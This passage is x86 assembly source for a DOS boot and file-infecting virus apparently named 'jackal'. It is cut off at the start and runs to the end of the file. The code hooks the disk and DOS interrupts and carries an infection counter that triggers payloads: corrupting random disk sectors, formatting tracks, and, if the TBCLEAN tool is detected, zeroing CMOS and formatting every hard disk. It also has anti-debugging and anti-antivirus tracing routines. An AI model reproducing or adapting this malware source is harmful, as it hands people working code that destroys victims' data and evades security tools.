                mov     bx,offset boot_buffer
                mov     cx,1
                push    cs
                pop     es
                int     13h                     ; read sector
                jb      is_protect_yes
                mov     ax,301h
                int     13h                     ; write it back
                jb      is_protect_yes
is_protect_no:  clc
                retn
                   
;=====( Paragraph align address in SI )======================================;

para_align:     mov     ds:write_size,file_size ; write file_size bytes
                mov     ds:exe_file_mod,file_size mod 512
                test    si,0fh                  ; needs alignment
                je      no_para_align
                push    si
                neg     si
                and     si,0fh
                sub     ds:write_size,si        ; write less bytes
                add     ds:exe_file_mod,si      ; load less
                pop     si
                and     si,0fff0h               ; get rid of last digit
                add     si,10h                  ; next paragraph
no_para_align:  push    ax ds
                xchg    ax,di                   ; High size
                call    get_dcb                 ; get dcb address
                mov     word ptr ds:[di.dcb_pos],si
                mov     word ptr ds:[di.dcb_pos+2],ax ; lseek to end
                xchg    ax,di
                pop     ds ax
                retn

;=====( Swap Int 13h, 15h and 40h with addresses in our copy of IVT )========;

hook_disk:      push    ax bx dx ds es
                mov     al,13h                  ; start with int 13h
                mov     di,offset int_13
hook_disk_loop: call    get_int                 ; get current address
                mov     dx,es
                xchg    bx,cs:[di]              ; swap offsets
                xchg    bx,dx
                xchg    bx,cs:[di + 2]          ; swap segments
                mov     ds,bx
                call    set_int                 ; set it
                cmp     al,15h
                mov     al,15h                  ; CY set if al=13h
                mov     di,offset int_15
                jb      hook_disk_loop
                mov     al,40h                  ; ZF set if al=15h
                mov     di,offset int_40
                je      hook_disk_loop          ; otherwise exit (al=40h)
                pop     es ds dx bx ax
                retn

;=====( Get DCB address )====================================================;

get_dcb:        push    ax bx
                mov     bx,cs:handle            ; get file handle
                mov     ax,1220h
                int     2fh                     ; get DCB number
                mov     bl,es:[di]
                cmp     al,-1                   ; invalid handle?
                je      get_dcb_err
                mov     ax,1216h
                int     2fh                     ; get DCB address
                push    es
                pop     ds
                test    byte ptr ds:[di.dcb_dev_attr],80h ; is it a file?
                jne     get_dcb_err
                clc
                mov     al,0                    ; skip next instruction
                org     $ - 1
get_dcb_err:    stc
                pop     bx ax
                retn
                
;=====( Update infection counter, and do nasty routine if TEST FFh )=========;

up_count:       push    cs
                pop     ds
                inc     ds:counter              ; up counter
                mov     ax,word ptr ds:int_13   ; get int 13h address
                cmp     ax,word ptr ds:int_40   ; same as int 40h (is there
                                                ; a hard disk?)
                je      up_count_ret
                mov     ax,ds:counter           ; get infection count
                test    al,1fh                  ; 32 infections?
                je      up_count_32
                mov     cx,666h                
                xor     dx,dx
                div     cx                      ; another 666h?
                or      dx,dx
                je      up_count_666
up_count_ret:   retn

up_count_32:    call    get_sect                ; get a random sector
                mov     ax,201h
                mov     bx,offset boot_buffer
                int     13h                     ; read sector
                jb      up_count_ret
                mov     ax,ds:[46ch]            ; get random word
                and     ah,1
                push    bx
                add     bx,ax                   ; get random sector index
                in      al,40h
                or      byte ptr es:[bx],al     ; encypher byte
                pop     bx
                mov     ax,301h
                int     13h                     ; write it back to disk
                retn

up_count_666:   call    get_sect                ; get a random track
                mov     ax,501h
                mov     bx,offset boot_buffer
                int     13h                     ; format track 
                retn
                
counter         dw      ?

;=====( Get a random sector )================================================;

get_sect:       mov     ah,08h
                mov     dl,80h
                int     13h                     ; get disk parameters
                jnb     get_sect_rnd
                mov     cx,0047h                ; 7 sectors, 100h tracks
                mov     dh,4h                   ; 4 heads
get_sect_rnd:   xor     ax,ax
                mov     ds,ax
                mov     ax,ds:[46ch]            ; get low timer word
                push    cs
                pop     es
                push    dx cx
                mov     bx,cx
                mov     cl,6h
                shr     bx,cl                   ; get tracks
                mov     dx,ax
                div     bx                      ; get track number
                or      bx,bx                   ; dividing by 0?
                je      get_sect_rnd1
                xor     dx,dx
                div     bx
get_sect_rnd1:  shl     dx,cl                   ; back to position
                mov     cx,dx
                pop     bx
                and     bl,00111111b            ; get sector count
                in      al,40h                  ; get random byte
                mov     ah,al
                or      bl,bl                   ; divide by 0?                
                je      get_sect_rnd2
                xor     ah,ah
                div     bl                      ; get random sector
get_sect_rnd2:  and     ah,00111111b            ; mask for sectors only
                or      cl,ah
                pop     bx
                in      al,40h
                mov     ah,al
                or      bh,bh                   ; divide by 0?
                je      get_sect_rnd3
                xor     ah,ah
                div     bh                      ; get random head
get_sect_rnd3:  xchg    ah,dh
                mov     dl,80h                  ; drive C:
                retn

;=====( Zero CMOS and Format all hard disk, if TBCLEAN is active )===========;

destroy:        in      al,21h
                or      al,2                    ; keyboard off
                out     21h,al  
                mov     ax,0ffh
destroy_cmos:   out     70h,al                  ; set CMOS index
                xchg    al,ah
                out     71h,al                  ; Zero CMOS
                xchg    al,ah
                dec     ax
                jns     destroy_cmos
                mov     dl,80h                  ; start with drive C:
destroy_disk:   push    dx
                mov     ah,8
                call    call_13                 ; get drive parameters
                pop     ax                
                mov     ah,al                
                sub     al,80h                  ; get drive - 80h
                cmp     al,dl                   ; last drive?
                jne     destroy_next
                cli
                hlt
                
destroy_next:   mov     dl,ah                   ; restore drive #
                mov     si,dx
                and     cl,11000000b            ; discard sectors
                mov     bp,cx
                mov     bx,offset copyright
                push    cs
                pop     es
                xor     dh,dh
destroy_track:  xor     cx,cx
destroy_format: mov     ax,501h
                call    call_13                 ; format disk
                and     cl,11000000b            ; discard returns
                cmp     cx,bp                   ; last track destroyed?
                je      destroy_head
                inc     ch                      ; next track low
                jne     destroy_format
                add     cl,40h                  ; next track high
                jmp     destroy_format

destroy_head:   inc     dh                      ; next head
                cmp     dx,si
                jbe     destroy_track
                inc     dl                      ; next drive
                jmp     destroy_disk
                
;=====( Interrupt 1 handler )================================================;

tracer:         mov     cs:int_1_ds,ds
                push    cs
                pop     ds
                mov     ds:int_1_ax,ax                
                mov     ds:int_1_bx,bx
                mov     ds:int_1_cx,cx
                mov     ds:int_1_dx,dx
                mov     ds:int_1_di,di
                mov     ds:tracer_exit,int_1_iret
                pop     bx cx dx                ; get flags, cs and ip
                mov     ax,cs
                cmp     ax,cx                   ; in our CS?
                jne     $
trace_mode      =       byte ptr $ - 1
                jmp     tracer_iret

tracer_dos_13:  cmp     cx,ds:dos_seg           ; in DOS code?
                ja      tracer_cont
                mov     word ptr ds:dos_13,bx
                mov     word ptr ds:dos_13+2,cx ; save address of DOS 13h
                mov     ds:trace_mode,find_13   ; now find BIOS int 13h
                jmp     tracer_cont

tracer_21:      cmp     cx,1234h                ; in DOS code?
dos_seg         =       word ptr $ - 2
                ja      tracer_cont
                mov     di,offset int_21        ; where to save address
                jmp     tracer_sto

tracer_13:      mov     di,offset int_13
tracer_bios:    cmp     ch,0c8h                 ; below BIOS?
                jb      tracer_cont
                cmp     cx,0f400h               ; above BIOS?
                ja      tracer_cont
tracer_sto:     mov     ds:[di],bx
                mov     ds:[di + 2],cx          ; save address
                mov     ds:tracer_exit,int_1_end ; turn off TF on exit
                jmp     tracer_cont

tracer_15:      mov     di,offset int_15        ; store here for int 15h
                jmp     tracer_bios

tracer_40:      mov     di,offset int_40        ; store here for int 40h
                jmp     tracer_bios

tracer_step_21: dec     ds:inst_count           ; -1 from counter
                jne     tracer_cont
                mov     al,1
                push    dx
                lds     dx,ds:int_1
                call    set_int                 ; unhook int 1h
                pop     dx
                call    swap_21                 ; insert jump
                mov     cs:tracer_exit,int_1_end ; no more tracing

tracer_cont:    mov     ds,cx                   ; segment of inst.
get_inst:       xor     di,di
get_inst1:      mov     ax,ds:[di + bx]         ; get instruction opcode
                cmp     al,0f0h                 ; LOCK?
                je      skip_prefix
                cmp     al,0f2h                 ; REPNE?
                je      skip_prefix
                cmp     al,0f3h                 ; REPE?
                je      skip_prefix
                cmp     al,9ch                  ; PUSHF or above?
                jae     emulate_pushf
                and     al,11100111b            ; 26h,2eh,36h,3eh=26h
                cmp     al,26h                  ; SEG?
                jne     tracer_cont1
skip_prefix:    inc     di
                jmp     get_inst1

emulate_pushf:  jne     emulate_popf
                and     dh,not 1h               ; TF off
                push    dx                      ; fake PUSHF
get_next_inst:  lea     bx,ds:[bx + di + 1]     ; skip instruction
get_next_inst1: or      dh,1                    ; TF on
                jmp     get_inst

emulate_popf:   cmp     al,9dh                  ; POPF?
                jne     emulate_iret
                pop     dx                      ; fake POPF
                jmp     get_next_inst

emulate_iret:   cmp     al,0cfh                 ; IRET?
                jne     emulate_int
                pop     bx cx dx                ; get flags, cs & ip (IRET)
                jmp     get_next_inst1

emulate_int:    cmp     al,0cdh                 ; INT xx?
                je      emulate_int_xx
                cmp     al,0cch                 ; INT 3?
                mov     ah,3h
                je      emulate_int_x
                cmp     al,0ceh                 ; INTO?
                mov     ah,4
                jne     tracer_cont1
                test    dh,8                    ; OF set?
                je      tracer_cont1
emulate_int_x:  dec     bx                      ; one byte interrupt
emulate_int_xx: lea     bx,ds:[bx + di + 2]     ; skip two-byte interrupt
                and     dh,not 1                ; TF off
                push    dx cx bx                ; flags, cs & ip (INT)
                xchg    al,ah                   ; INT # into AL
                push    es
                call    get_int                 ; get int address
                mov     cx,es                   ; segment on int
                pop     es
                jmp     get_next_inst1

tracer_cont1:   jmp     $
tracer_exit     =       byte ptr $ - 1

tracer_end:     and     dh,not 1                ; TF off for no more tracing
tracer_iret:    push    dx cx bx                ; save flags, cs & ip
                mov     ax,0
int_1_ds        =       word ptr $ - 2
                mov     ds,ax
                mov     ax,0
int_1_ax        =       word ptr $ - 2
                mov     bx,0
int_1_bx        =       word ptr $ - 2
                mov     cx,0
int_1_cx        =       word ptr $ - 2
                mov     dx,0
int_1_dx        =       word ptr $ - 2
                mov     di,0
int_1_di        =       word ptr $ - 2                
                iret

;=====( Detect and Disable TBCLEAN )=========================================;

anti_tbclean:   pushf
                pop     dx                      ; get flags
                and     dh,not 1                ; TF on
                push    dx dx
                popf
                push    ss
                pop     ss                      ; next inst. not trapped
                pushf
                pop     dx
                test    dh,1                    ; TF set?
                pop     dx
                je      anti_tb_no
                xor     bp,bp
                mov     cx,ss
                cli
                mov     ss,bp                   ; segment 0
                les     di,ss:[bp + 1h * 4h]    ; get address of int 1h
                mov     ss,cx
                sti
                mov     al,0cfh                 ; IRET
                stosb                           ; disable int 1h
                push    dx
                popf
                mov     ds:host_jump,do_destroy ; mark destroy flag
anti_tb_no:     retn


;=====( Copy ints 0 - 0ffh to interrupts )===================================;

copy_ints:      mov     cx,100h * 2h
                xor     si,si
                mov     di,offset interrupts    ; buffer to old vectors
                mov     ds,si
                cld
                rep     movsw
                mov     si,13h * 4h             ; do int 13h once more
                push    si
                movsw
                movsw                           ; to dos_13
                pop     si
                cmp     byte ptr ds:[475h],0    ; any hard disk here?
                jne     copy_ints_ret
                mov     di,offset int_40        ; no? Then no int 40h either
                movsw
                movsw                           ; copy int 13h over int 40h
copy_ints_ret:  push    cs
                pop     ds
                retn
                
;=====( hook ints 9 and 13h )================================================;

hook_boot:      push    dx
                mov     al,09h
                mov     dx,offset jackal_9      ; Keyboard handler
                call    set_int                 ; hook int 9
                mov     al,13h
                mov     dx,offset jackal_13
                call    set_int                 ; hook int 13h
                mov     ds:origin,boot          ; remember origin
                mov     ds:hook_21,yes_hook_21  ; hook int 21h when DOS loads
                pop     dx
                retn

;=====( Get interrupts address )=============================================;

get_int:        push    ax
                xor     ah,ah
                add     ax,ax
                add     ax,ax
                xchg    ax,bx
                xor     ax,ax
                mov     es,ax                   ; segment 0
                les     bx,es:[bx]              ; get int address
                pop     ax
                retn

;=====( Set interrupts address )=============================================;

set_int:        push    ax bx ds
                xor     ah,ah
                add     ax,ax
                add     ax,ax
                xchg    ax,bx
                xor     ax,ax
                push    ds
                mov     ds,ax
                mov     ds:[bx],dx              ; set int address
                pop     ds:[bx + 2]
                pop     ds bx ax
                retn

;=====( Push all registers )=================================================;

push_all:       pop     cs:push_pop_ret
                pushf
                push    ax bx cx dx bp si di ds es
                jmp     cs:push_pop_ret

;=====( Pop all registers )==================================================;

pop_all:        pop     cs:push_pop_ret
                pop     es ds di si bp dx cx bx ax
                popf
                jmp     cs:push_pop_ret

;=====( swap jumps to us in and out of DOS handlers )========================;

swap_13:        call    push_all
                mov     si,offset jump_code_13  ; far jump to jackal_13
                les     di,cs:dos_13            ; DOS' int 13h handler
                jmp     swap_code

swap_21:        call    push_all
                mov     si,offset jump_code_21  ; far jump to jackal_21
                les     di,cs:int_21            ; DOS' int 21h handler
swap_code:      push    cs
                pop     ds
                cmp     ds:origin,file          ; only if loaded from file
                jne     swap_code_ret
                mov     cx,5                    ; swap 5 bytes (ea xx xx xx xx)
                cld
swap_code_loop: lodsb                           ; get byte from jump_code_xx
                xchg    al,es:[di]              ; swap with DOS code
                mov     ds:[si-1],al            ; save DOS code
                inc     di
                loop    swap_code_loop
swap_code_ret:  call    pop_all
                retn


;=====( Call DOS/BIOS interrupts )===========================================;

call_dos_13:    call    swap_13                 ; remove jump
                pushf
                call    cs:dos_13
                call    swap_13                 ; insert jump
                retn

;=====( Error handler )======================================================;

jackal_24:      mov     al,3
                iret
                
call_13:        pushf
                call    cs:int_13
                retn


call_21_file:   mov     bx,0
handle          =       word ptr $ - 2
call_21:        pushf
                call    cs:int_21
                retn

                db      10h dup(0)

file_end:       




inst_count      db      ?

push_pop_ret    dw      ?

jump_code_13    db      5 dup(?)
jump_code_21    db      5 dup(?)

temp_header     dw      1ch / 2 dup(?)

boot_buffer     db      512 dup(?)

interrupts      dd      100h dup(?)
dos_13          dd      ?



jackal_end:     


;=====( Very useful structures )=============================================;



;=====( Memory Control Block structure )=====================================;

mcb             struc
mcb_sig         db      ?               ; 'Z' or 'M'
mcb_owner       dw      ?               ; attribute of owner
mcb_size        dw      ?               ; size of mcb block
mcb_name        db      8 dup(?)        ; file name of owner
mcb             ends


;=====( For functions 11h and 12h )==========================================;


Directory       STRUC
DS_Drive        db ?
DS_Name         db 8 dup(0)
DS_Ext          db 3 dup(0)
DS_Attr         db ?
DS_Reserved     db 10 dup(0)
DS_Time         dw ?
DS_Date         dw ?
DS_Start_Clust  dw ?
DS_Size         dd ?
Directory       ENDS


;=====( for functions 4eh and 4fh )==========================================;


DTA             STRUC
DTA_Reserved    db 21 dup(0)
DTA_Attr        db ?
DTA_Time        dw ?
DTA_Date        dw ?
DTA_Size        dd ?
DTA_Name        db 13 dup(0)
DTA             ENDS


Exe_Header      STRUC
EH_Signature    dw ?                    ; Set to 'MZ' or 'ZM' for .exe files
EH_Modulo       dw ?                    ; remainder of file size/512
EH_Size         dw ?                    ; file size/512
EH_Reloc        dw ?                    ; Number of relocation items
EH_Size_Header  dw ?                    ; Size of header in paragraphs
EH_Min_Mem      dw ?                    ; Minimum paragraphs needed by file
EH_Max_Mem      dw ?                    ; Maximum paragraphs needed by file
EH_SS           dw ?                    ; Stack segment displacement
EH_SP           dw ?                    ; Stack Pointer
EH_Checksum     dw ?                    ; Checksum, not used
EH_IP           dw ?                    ; Instruction Pointer of Exe file
EH_CS           dw ?                    ; Code segment displacement of .exe
eh_1st_reloc    dw      ?               ; first relocation item
eh_ovl          dw      ?               ; overlay number
Exe_Header      ENDS                      

Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?               
bs_FATs                 db ?             ; Number of FATs
bs_Root_Dir_Entries     dw ?             ; Max number of root dir entries
bs_Sectors              dw ?             ; number of sectors; small
bs_Media                db ?             ; Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?               
bs_Heads                dw ?             ; number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ; number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS
                
                
Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ; partition table code
pt_Status               db ?            ; 0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ; 1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS


int_1_stack     STRUC
st_ip           dw ?                    ; offset of next instruction after
                                        ; interrupt
st_cs           dw ?                    ; segment of next instruction
st_flags        dw ?                    ; flags when interrupt was called
int_1_stack     ENDS

;----------------------------------------------------------------------------;
;               Dcb description for DOS 3+                                   ;   
;                                                                            ;
;      Offset  Size    Description                                           ;
;       00h    WORD    number of file handles referring to this file         ;
;       02h    WORD    file open mode (see AH=3Dh)                           ;
;              bit 15 set if this file opened via FCB                        ;
;       04h    BYTE    file attribute                                        ;
;       05h    WORD    device info word (see AX=4400h)                       ;
;       07h    DWORD   pointer to device driver header if character device   ;
;              else pointer to DOS Drive Parameter Block (see AH=32h)        ;
;       0Bh    WORD    starting cluster of file                              ;
;       0Dh    WORD    file time in packed format (see AX=5700h)             ;
;       0Fh    WORD    file date in packed format (see AX=5700h)             ;
;       11h    DWORD   file size                                             ;
;       15h    DWORD   current offset in file                                ;
;       19h    WORD    relative cluster within file of last cluster accessed ;
;       1Bh    WORD    absolute cluster number of last cluster accessed      ;
;              0000h if file never read or written???                        ;
;       1Dh    WORD    number of sector containing directory entry           ;
;       1Fh    BYTE    number of dir entry within sector (byte offset/32)    ;
;       20h 11 BYTEs   filename in FCB format (no path/period, blank-padded) ;
;       2Bh    DWORD   (SHARE.EXE) pointer to previous SFT sharing same file ;
;       2Fh    WORD    (SHARE.EXE) network machine number which opened file  ;
;       31h    WORD    PSP segment of file's owner (see AH=26h)              ;
;       33h    WORD    offset within SHARE.EXE code segment of               ;
;              sharing record (see below)  0000h = none                      ;
;----------------------------------------------------------------------------;                                                                            



dcb             struc
dcb_users       dw      ?
dcb_mode        dw      ?
dcb_attr        db      ?
dcb_dev_attr    dw      ?
dcb_drv_addr    dd      ?
dcb_1st_clst    dw      ?
dcb_time        dw      ?
dcb_date        dw      ?
dcb_size        dd      ?
dcb_pos         dd      ?
dcb_last_clst   dw      ?
dcb_current_clst dw     ?
dcb_dir_sec     dw      ?
dcb_dir_entry   db      ?
dcb_name        db      8 dup(?)
dcb_ext         db      3 dup(?)
dcb_useless1    dw      ?
dcb_useless2    dw      ?
dcb_useless3    dw      ?
dcb_psp_seg     dw      ?
dcb_useless4    dw      ?
dcb             ends

bpb                     STRUC
bpb_Bytes_Per_Sec       dw ?
bpb_Sec_Per_Clust       db ?
bpb_Reserved_Sectors    dw ?               
bpb_FATs                db ?             ; Number of FATs
bpb_Root_Dir_Entries    dw ?             ; Max number of root dir entries
bpb_Sectors             dw ?             ; number of sectors; small
bpb_Media               db ?             ; Media descriptor byte
bpb_Sectors_Per_FAT     dw ?
bpb_Sectors_Per_Track   dw ?               
bpb_Heads               dw ?             ; number of heads
bpb_Hidden_Sectors      dd ?
bpb_Huge_Sectors        dd ?             ; number of sectors; large
bpb_Drive_Number        db ?
bpb_Reserved            db ?
bpb_Boot_Signature      db ?
bpb_Volume_ID           dd ?
bpb_Volume_Label        db 11 dup(?)
bpb_File_System_Type    db 8 dup(?)
bpb                     ENDS


register        struc
reg_es          dw      ?
reg_ds          dw      ?
reg_di          dw      ?
reg_si          dw      ?
reg_bp          dw      ?
reg_dx          dw      ?
reg_cx          dw      ?
reg_bx          dw      ?
reg_ax          dw      ?
reg_f           dw      ?
register        ends


                end     jackal
                